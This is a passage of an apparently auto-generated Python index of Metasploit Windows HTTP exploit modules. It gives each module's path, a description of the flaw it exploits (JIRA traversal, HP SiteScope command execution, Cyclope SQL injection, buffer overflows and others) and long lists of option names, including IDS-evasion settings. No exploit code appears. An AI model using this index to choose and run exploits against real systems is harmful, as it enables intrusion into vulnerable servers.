			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_jira_collector_traversal(object):
		"""
		
        This module exploits a directory traversal flaw in JIRA 6.0.3. The vulnerability exists
        in the issues collector code, while handling attachments provided by the user. It can be
        exploited in Windows environments to get remote code execution. This module has been tested
        successfully on JIRA 6.0.3 with Windows 2003 SP2 Server.
      
		"""

		path = 'windows/http/jira_collector_traversal'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_TARGETURI = 'TARGETURI'
			required_COLLECTOR = 'COLLECTOR'
			required_JIRA_PATH = 'JIRA_PATH'
			required_TRAVERSAL_DEPTH = 'TRAVERSAL_DEPTH'

	class windows_http_hp_sitescope_runomagentcommand(object):
		"""
		
          This module exploits a code execution flaw in HP SiteScope.
        The vulnerability exists in the opcactivate.vbs script, which
        is reachable from the APIBSMIntegrationImpl AXIS service, and
        uses WScript.Shell.run() to execute cmd.exe with user provided
        data. Note that the opcactivate.vbs component is installed
        with the (optional) HP Operations Agent component. The module
        has been tested successfully on HP SiteScope 11.20 (with HP
        Operations Agent) over Windows 2003 SP2.
      
		"""

		path = 'windows/http/hp_sitescope_runomagentcommand'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			required_TARGETURI = 'TARGETURI'

	class windows_http_ca_arcserve_rpc_authbypass(object):
		"""
		
          This module exploits an information disclosure vulnerability in the CA Arcserve
        D2D r15 web server. The information disclosure can be triggered by sending a
        specially crafted RPC request to the homepage servlet. This causes CA Arcserve to
        disclosure the username and password in cleartext used for authentication. This
        username and password pair are Windows credentials with Administrator access.
      
		"""

		path = 'windows/http/ca_arcserve_rpc_authbypass'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_cyclope_ess_sqli(object):
		"""
		
        This module exploits a SQL injection found in Cyclope Employee Surveillance
        Solution.  Because the login script does not properly handle the user-supplied
        username parameter, a malicious user can manipulate the SQL query, and allows
        arbitrary code execution under the context of 'SYSTEM'.
      
		"""

		path = 'windows/http/cyclope_ess_sqli'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_TARGETURI = 'TARGETURI'

	class windows_http_hp_nnm_toolbar_01(object):
		"""
		
          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.50.
        By sending a specially crafted CGI request to Toolbar.exe, an attacker may be able to execute
        arbitrary code.
      
		"""

		path = 'windows/http/hp_nnm_toolbar_01'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_hp_imc_bims_upload(object):
		"""
		
          This module exploits a directory traversal vulnerability on the version 5.2 of the BIMS
        component from the HP Intelligent Management Center. The vulnerability exists in the
        UploadServlet, allowing the user to download and upload arbitrary files. This module has
        been tested successfully on HP Intelligent Management Center with BIMS 5.2 E0401 on Windows
        2003 SP2.
      
		"""

		path = 'windows/http/hp_imc_bims_upload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			FileDropperDelay = 'FileDropperDelay'

	class windows_http_hp_mpa_job_acct(object):
		"""
		
        This module exploits an arbitrary file upload vulnerability on HP Managed Printing
        Administration 2.6.3 and prior versions. The vulnerability exists in the UploadFiles()
        function from the MPAUploader.Uploader.1 control, loaded and used by the server.
        The function can be abused via directory traversal and null byte injection in order
        to achieve arbitrary file upload. In order to exploit successfully, a few conditions
        must be met. First, a writable location under the context of Internet Guest Account
        (IUSR_*) or Everyone is required. By default, this module will attempt to write to
        /hpmpa/userfiles/, but the WRITEWEBFOLDER option can be used to provide
        another writable path. Second, the writable path must also be readable by a browser,
        so this typically means a location under wwwroot. Finally, you cannot overwrite
        a file with the same name as the payload.
      
		"""

		path = 'windows/http/hp_mpa_job_acct'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			WRITEWEBFOLDER = 'WRITEWEBFOLDER'

	class windows_http_novell_mdm_lfi(object):
		"""
		
        This module exercises a vulnerability in Novel Zenworks Mobile Management's Mobile Device Management component
        which can allow unauthenticated remote code execution. Due to a flaw in the MDM.php script's input validation,
        remote attackers can both upload and execute code via a directory traversal flaw exposed in the 'language'
        parameter of a POST call to DUSAP.php.
      
		"""

		path = 'windows/http/novell_mdm_lfi'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			required_SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_TARGETURI = 'TARGETURI'

	class windows_http_novell_imanager_upload(object):
		"""
		
          This module exploits a directory traversal vulnerability which
        allows remote attackers to upload and execute arbitrary code.

        PortalModuleInstallManager
      
		"""

		path = 'windows/http/novell_imanager_upload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_altn_webadmin(object):
		"""
		
        Alt-N WebAdmin is prone to a buffer overflow condition. This
        is due to insufficient bounds checking on the USER
        parameter. Successful exploitation could result in code
        execution with SYSTEM level privileges.
      
		"""

		path = 'windows/http/altn_webadmin'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
